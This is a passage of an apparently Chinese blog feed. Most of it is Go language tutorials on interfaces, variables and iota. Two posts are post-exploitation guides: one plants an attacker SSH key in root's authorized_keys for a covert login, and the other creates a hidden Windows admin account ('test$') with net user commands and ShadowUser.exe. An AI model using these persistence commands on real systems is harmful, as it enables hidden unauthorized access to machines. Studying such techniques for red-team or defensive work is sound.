class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Dog)</span> <span class="title">Sleep</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(<span class="string">"Dog is Sleep"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Dog)</span> <span class="title">GetColor</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   <span class="keyword">return</span> this.color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Dog)</span> <span class="title">GetType</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"Dog"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showAnimal</span><span class="params">(animal AnimalIF)</span></span> &#123;</span><br><span class="line">   animal.Sleep() <span class="comment">//多态</span></span><br><span class="line">   fmt.Println(<span class="string">"color = "</span>, animal.GetColor())</span><br><span class="line">   fmt.Println(<span class="string">"kind = "</span>, animal.GetType())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> animal AnimalIF <span class="comment">//接口的数据类型， 父类指针</span></span><br><span class="line">   animal = &amp;Cat&#123;<span class="string">"Green"</span>&#125;</span><br><span class="line"></span><br><span class="line">   animal.Sleep() <span class="comment">//调用的就是Cat的Sleep()方法 , 多态的现象</span></span><br><span class="line"></span><br><span class="line">   animal = &amp;Dog&#123;<span class="string">"Yellow"</span>&#125;</span><br><span class="line"></span><br><span class="line">   animal.Sleep() <span class="comment">// 调用Dog的Sleep方法，多态的现象</span></span><br><span class="line"></span><br><span class="line">   cat := Cat&#123;<span class="string">"Green"</span>&#125;</span><br><span class="line">   dog := Dog&#123;<span class="string">"Yellow"</span>&#125;</span><br><span class="line"></span><br><span class="line">   showAnimal(&amp;cat)</span><br><span class="line">   showAnimal(&amp;dog)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="interface-提供-“类型断言”-的机制"><a href="#interface-提供-“类型断言”-的机制" class="headerlink" title="interface{} 提供 “类型断言” 的机制"></a>interface{} 提供 “类型断言” 的机制</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//interface&#123;&#125;是万能数据类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myFunc</span><span class="params">(arg <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">   fmt.Println(<span class="string">"myFunc is called..."</span>)</span><br><span class="line">   fmt.Println(arg)</span><br><span class="line"></span><br><span class="line">   <span class="comment">//interface&#123;&#125; 改如何区分 此时引用的底层数据类型到底是什么？</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//给 interface&#123;&#125; 提供 “类型断言” 的机制</span></span><br><span class="line">   value, ok := arg.(<span class="keyword">string</span>)</span><br><span class="line">   <span class="keyword">if</span> !ok &#123;</span><br><span class="line">      fmt.Println(<span class="string">"arg is not string type"</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">"arg is string type, value = "</span>, value)</span><br><span class="line"></span><br><span class="line">      fmt.Printf(<span class="string">"value type is %T\n"</span>, value)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">   auth <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   book := Book&#123;<span class="string">"Golang"</span>&#125;</span><br><span class="line"></span><br><span class="line">   myFunc(book)</span><br><span class="line">   myFunc(<span class="number">100</span>)</span><br><span class="line">   myFunc(<span class="string">"abc"</span>)</span><br><span class="line">   myFunc(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang 开发语言 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无密码Linux主机利用公钥直接连接</title>
      <link href="/2021/10/13/%E6%97%A0%E5%AF%86%E7%A0%81Linux%E4%B8%BB%E6%9C%BA%E5%88%A9%E7%94%A8%E5%85%AC%E9%92%A5%E7%9B%B4%E6%8E%A5%E8%BF%9E%E6%8E%A5/"/>
      <url>/2021/10/13/%E6%97%A0%E5%AF%86%E7%A0%81Linux%E4%B8%BB%E6%9C%BA%E5%88%A9%E7%94%A8%E5%85%AC%E9%92%A5%E7%9B%B4%E6%8E%A5%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a><strong>0x00 前提</strong></h1><ul><li>以前的老东西，拿出水一篇</li><li>一般是通过 Rce，提权等等情况，拿到目标 linux 的 root 权限</li><li>主要是没有密码， hash 跑不出来，机器无法正常出网</li><li>就可以去试着正向链接</li></ul><h1 id="0x01-首先目标主机，修改目标-Ssh-服务配置"><a href="#0x01-首先目标主机，修改目标-Ssh-服务配置" class="headerlink" title="0x01 首先目标主机，修改目标 Ssh 服务配置"></a><strong>0x01 首先目标主机，修改目标 Ssh 服务配置</strong></h1><p>启用ssh证书登录，并重启SSH 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo RSAAuthentication yes &gt;&gt; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">echo PubkeyAuthentication yes &gt;&gt; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><h1 id="0x02-本地linux上生成密钥"><a href="#0x02-本地linux上生成密钥" class="headerlink" title="0x02 本地linux上生成密钥"></a><strong>0x02 本地linux上生成密钥</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ssh-keygen -t rsa -P &quot;&quot; -f ~&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure><p>注意：这一步最好去一个纯净的Linux生成，因为这个key会暴露你的主机名</p><p><img src="https://img-blog.csdnimg.cn/img_convert/32531c4bc1be69500a4898d7ccadae4a.png" alt="image-20211012225853932"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;找见id_rsa.pub自行拷贝出来</span><br><span class="line">ls -al &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">cp &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;home&#x2F;xxxx&#x2F;Desktop&#x2F;</span><br><span class="line">&#x2F;&#x2F;赋于权限</span><br><span class="line">chmod 777 &#x2F;home&#x2F;xxxx&#x2F;Desktop&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure><p>/root/.ssh/文件夹里面有俩文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id_rsa(私钥)</span><br><span class="line">id_rsa.pub(公钥)</span><br></pre></td></tr></table></figure><h1 id="0x03-linux目标机写入公钥"><a href="#0x03-linux目标机写入公钥" class="headerlink" title="0x03 linux目标机写入公钥"></a><strong>0x03 linux目标机写入公钥</strong></h1><ol><li><p>自行上传公钥到内网linux,并将其保存到/root/.ssh/目录下,文件名改为authorized_keys，或者命令执行用echo追加</p></li><li><p>如目标已事先存在authorized_keys文件,直接往最后追加即可</p><ol start="3"><li>注意：再操作之前要对原authorized_keys进行“备份”，以备不时之需。</li></ol></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8Zrks74SYQ4JzKFvYPyL2tG+Scx&#x2F;y&#x2F;gIDk5znJF6XKjJ2MFS7RfsjKqpRk7bb+bDpgb5awiMzMOUgwBDheJKerji9&#x2F;FD+jHEI133ejCZphiPL0+OItLdl7uUt+NFMMPNeXh9lmDOwApxVg54xhDjyzWYaV6xQgvWuZK+6qNBD1TW2&#x2F;zXImeHpC+L37KQSgFvtxyOiYw&#x2F;Uq&#x2F;Caoa9VkcFsUsJ1ftmKSh7unkEJiJAHpzmI0SquNdrgTJ5AiVclQbTa8viyl+irXYjUyvxWKCqBhMhuQQFEMRdViVStgSRoVREEH361J7T7oCC0rJE2XV8MlejXZGi7if34gYHYgyBKvEQ9&#x2F;Ff+fkQV5LXdZLkC0h3wOBLV9lWwMamlFSjJMTSBlZP1syHYV&#x2F;X1YNO76SmLUUi48PwDQa52g0tI2TusDmjgARWxwhCndu463dwbCcGjfHnSEAWEB2WGJcKOcpfGLUrdDt9My&#x2F;d26dfMTNdlaw+kdnDVlYvk0qnyBBZhyfE&#x3D; Zeo@ZeoMacBook-Pro.local &gt;&gt; &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><h1 id="0x04-幽灵登录"><a href="#0x04-幽灵登录" class="headerlink" title="0x04 幽灵登录"></a><strong>0x04 幽灵登录</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@192.168.1.1 &#x2F;usr&#x2F;bin&#x2F;bash -i</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/4b1e676c8614c7ed5c31c0fb65e9eb49.png" alt="image-20211013142036434"></p><h1 id="0x05-利用Scp-无密码互传文件"><a href="#0x05-利用Scp-无密码互传文件" class="headerlink" title="0x05 利用Scp 无密码互传文件"></a><strong>0x05 利用Scp 无密码互传文件</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 22 -r &#x2F;root&#x2F;fsacn root@10.211.55.11:&#x2F;usr&#x2F;tmp&#x2F;fsacn</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux ssh centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限维持-影子用户后门</title>
      <link href="/2021/10/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7%E5%90%8E%E9%97%A8/"/>
      <url>/2021/10/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>水一篇内网东西，主要针对一种情况：抓到 hash 解不开, 又不想 pth, 就想直接登桌面</p><h1 id="0x01权限维持-影子用户后门"><a href="#0x01权限维持-影子用户后门" class="headerlink" title="0x01权限维持-影子用户后门"></a>0x01权限维持-影子用户后门</h1><p>影子账户，古老但有效！</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>代 $ 符号的用户名不会显示出来，仔通导出注册表，并修改F值，克隆账号，再删除账号</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><ol><li><code>net user</code>无法删除，需要删除注册表相关键值；</li><li>Windows 的登录界面不显示该用户信息。</li></ol><h1 id="0x02-简单实用"><a href="#0x02-简单实用" class="headerlink" title="0x02 简单实用"></a>0x02 简单实用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShadowUser.exe admin administrator</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/2d14d553934687d4c058c5050875fd1d.png" alt="image-20211012213802322"></p><p>可以正常登录，桌面什么也是克隆的administrator的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/de637da85bb1578a355047acd8775bef.png" alt="image-20211012214104249"></p><h2 id="单纯的创建隐藏用户"><a href="#单纯的创建隐藏用户" class="headerlink" title="单纯的创建隐藏用户"></a>单纯的创建隐藏用户</h2><p>我们先利用命令创建一个隐藏用户,并将其加入本地管理员组。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test$ Test123456 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go语言快速掌握语法特色--基本语法</title>
      <link href="/2021/09/29/go%E8%AF%AD%E8%A8%80%E5%BF%AB%E9%80%9F%E6%8E%8C%E6%8F%A1%E8%AF%AD%E6%B3%95%E7%89%B9%E8%89%B2--%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/09/29/go%E8%AF%AD%E8%A8%80%E5%BF%AB%E9%80%9F%E6%8E%8C%E6%8F%A1%E8%AF%AD%E6%B3%95%E7%89%B9%E8%89%B2--%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><ul><li><p>主要是针对：想快速低成本掌握golang开发人群，主要是讲区别其他语言的特色语法、用法和思想。</p></li><li><p>最好是已经熟悉了一门后段语言，可以快速的掌握和上手go语言</p></li><li><p>因为编程思想是想通的，对于已经熟练一门语言的开发者，只要掌握开发这个语言的特性，很快就能上手了。</p></li><li><p>下面的每个知识点，没有单独去拿出来讲，知识点都是在代码旁边的注释里面，我感觉还是蛮不错的，有代码例子应该很快就能理解</p></li></ul><h1 id="0x01-GO基本语法"><a href="#0x01-GO基本语法" class="headerlink" title="0x01 GO基本语法"></a>0x01 GO基本语法</h1><p><strong>注意go里面有个很特殊的：</strong><br><strong>每个变量声明之后必须要在后面使用，不允许存在变量声明没有使用的情况，所以下面的代码没有调试通，可以先看看，是不是有变量没有使用。</strong></p><h2 id="0x011-基本的函数编写格式：（括号、；）"><a href="#0x011-基本的函数编写格式：（括号、；）" class="headerlink" title="0x011 基本的函数编写格式：（括号、；）"></a>0x011 基本的函数编写格式：（括号、；）</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//程序的包名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">//函数的&#123;  一定是 和函数名在同一行的，否则编译错误</span></span><br><span class="line"><span class="comment">//golang中的表达式，加";", 和不加 都可以，建议是不加</span></span><br><span class="line">fmt.Println(<span class="string">" hello Go!"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x012-四种变量的声明方式"><a href="#0x012-四种变量的声明方式" class="headerlink" title="0x012 四种变量的声明方式"></a>0x012 四种变量的声明方式</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明全局变量 方法一、方法二、方法三是可以的</span></span><br><span class="line"><span class="keyword">var</span> gA <span class="keyword">int</span> = <span class="number">100</span></span><br><span class="line"><span class="keyword">var</span> gB = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用方法四 只能局部变量，在函数体内</span></span><br><span class="line"><span class="comment">// := 只能够用在 函数体内来声明</span></span><br><span class="line"><span class="comment">//gC := 200</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//方法一：声明一个变量 默认的值是0</span></span><br><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法二：声明一个变量，初始化一个值</span></span><br><span class="line"><span class="keyword">var</span> b <span class="keyword">int</span> = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法三：在初始化的时候，可以省去数据类型，通过值自动匹配当前的变量的数据类型</span></span><br><span class="line"><span class="keyword">var</span> c = <span class="number">100</span></span><br><span class="line"><span class="keyword">var</span> cc = <span class="string">"abcd"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法四：(常用的方法) 省去var关键字，直接自动匹配</span></span><br><span class="line">e := <span class="number">100</span></span><br><span class="line">f := <span class="string">"abcd"</span></span><br><span class="line">g := <span class="number">3.14</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明多个变量</span></span><br><span class="line"><span class="keyword">var</span> xx, yy <span class="keyword">int</span> = <span class="number">100</span>, <span class="number">200</span></span><br><span class="line"><span class="keyword">var</span> kk, ll = <span class="number">100</span>, <span class="string">"Aceld"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//多行的多变量声明</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">vv <span class="keyword">int</span>  = <span class="number">100</span></span><br><span class="line">jj <span class="keyword">bool</span> = <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line">fmt.Println(<span class="string">"自行输出吧"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x013-函数多返回值"><a href="#0x013-函数多返回值" class="headerlink" title="0x013 函数多返回值"></a>0x013 函数多返回值</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//一般返回</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo1</span><span class="params">(a <span class="keyword">string</span>, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"a = "</span>, a)</span><br><span class="line">fmt.Println(<span class="string">"b = "</span>, b)</span><br><span class="line"></span><br><span class="line">c := <span class="number">100</span></span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回多个返回值，匿名的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo2</span><span class="params">(a <span class="keyword">string</span>, b <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"a = "</span>, a)</span><br><span class="line">fmt.Println(<span class="string">"b = "</span>, b)</span><br><span class="line"><span class="keyword">return</span> <span class="number">666</span>, <span class="number">777</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回多个返回值， 有形参名称的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo3</span><span class="params">(a <span class="keyword">string</span>, b <span class="keyword">int</span>)</span> <span class="params">(r1 <span class="keyword">int</span>, r2 <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"---- foo3 ----"</span>)</span><br><span class="line">fmt.Println(<span class="string">"a = "</span>, a)</span><br><span class="line">fmt.Println(<span class="string">"b = "</span>, b)</span><br><span class="line"></span><br><span class="line"><span class="comment">//r1 r2 属于foo3的形参，  初始化默认的值是0</span></span><br><span class="line"><span class="comment">//r1 r2 作用域空间 是foo3 整个函数体的&#123;&#125;空间</span></span><br><span class="line">fmt.Println(<span class="string">"r1 = "</span>, r1)</span><br><span class="line">fmt.Println(<span class="string">"r2 = "</span>, r2)</span><br><span class="line"></span><br><span class="line"><span class="comment">//给有名称的返回值变量赋值</span></span><br><span class="line">r1 = <span class="number">1000</span></span><br><span class="line">r2 = <span class="number">2000</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有相同的返回类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo4</span><span class="params">(a <span class="keyword">string</span>, b <span class="keyword">int</span>)</span> <span class="params">(r1, r2 <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"---- foo4 ----"</span>)</span><br><span class="line">fmt.Println(<span class="string">"a = "</span>, a)</span><br><span class="line">fmt.Println(<span class="string">"b = "</span>, b)</span><br><span class="line"><span class="comment">//给有名称的返回值变量赋值</span></span><br><span class="line">r1 = <span class="number">1000</span></span><br><span class="line">r2 = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">c := foo1(<span class="string">"abc"</span>, <span class="number">555</span>)</span><br><span class="line">fmt.Println(<span class="string">"c = "</span>, c)</span><br><span class="line"></span><br><span class="line">ret1, ret2 := foo2(<span class="string">"haha"</span>, <span class="number">999</span>)</span><br><span class="line">fmt.Println(<span class="string">"ret1 = "</span>, ret1, <span class="string">" ret2 = "</span>, ret2)</span><br><span class="line"></span><br><span class="line">ret1, ret2 = foo3(<span class="string">"foo3"</span>, <span class="number">333</span>)</span><br><span class="line">fmt.Println(<span class="string">"ret1 = "</span>, ret1, <span class="string">" ret2 = "</span>, ret2)</span><br><span class="line"></span><br><span class="line">ret1, ret2 = foo4(<span class="string">"foo4"</span>, <span class="number">444</span>)</span><br><span class="line">fmt.Println(<span class="string">"ret1 = "</span>, ret1, <span class="string">" ret2 = "</span>, ret2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x014-iota-只能够配合const"><a href="#0x014-iota-只能够配合const" class="headerlink" title="0x014 iota 只能够配合const"></a>0x014 iota 只能够配合const</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//const 来定义枚举类型</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">//可以在const() 添加一个关键字 iota， 每行的iota都会累加1, 第一行的iota的默认值是0</span></span><br><span class="line">BEIJING = <span class="number">10</span>*<span class="literal">iota</span> <span class="comment">//iota = 0</span></span><br><span class="line">SHANGHAI   <span class="comment">//iota = 1</span></span><br><span class="line">SHENZHEN          <span class="comment">//iota = 2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a, b = <span class="literal">iota</span>+<span class="number">1</span>, <span class="literal">iota</span>+<span class="number">2</span> <span class="comment">// iota = 0, a = iota + 1, b = iota + 2, a = 1, b = 2</span></span><br><span class="line">c, d  <span class="comment">// iota = 1, c = iota + 1, d = iota + 2, c = 2, d = 3</span></span><br><span class="line">e, f  <span class="comment">// iota = 2, e = iota + 1, f = iota + 2, e = 3, f = 4</span></span><br><span class="line"></span><br><span class="line">g, h = <span class="literal">iota</span> * <span class="number">2</span>, <span class="literal">iota</span> *<span class="number">3</span>  <span class="comment">// iota = 3, g = iota * 2, h = iota * 3, g = 6, h = 9 </span></span><br><span class="line">i, k   <span class="comment">// iota = 4, i = iota * 2, k = iota * 3 , i = 8, k = 12</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//常量(只读属性)，常量是不允许修改的</span></span><br><span class="line"><span class="keyword">const</span> length <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line">fmt.Println(<span class="string">"length = "</span>, length)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"BEIJIGN = "</span>, BEIJING)</span><br><span class="line">fmt.Println(<span class="string">"SHANGHAI = "</span>, SHANGHAI)</span><br><span class="line">fmt.Println(<span class="string">"SHENZHEN = "</span>, SHENZHEN)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"a = "</span>, a, <span class="string">"b = "</span>, b)</span><br><span class="line">fmt.Println(<span class="string">"c = "</span>, c, <span class="string">"d = "</span>, d)</span><br><span class="line">fmt.Println(<span 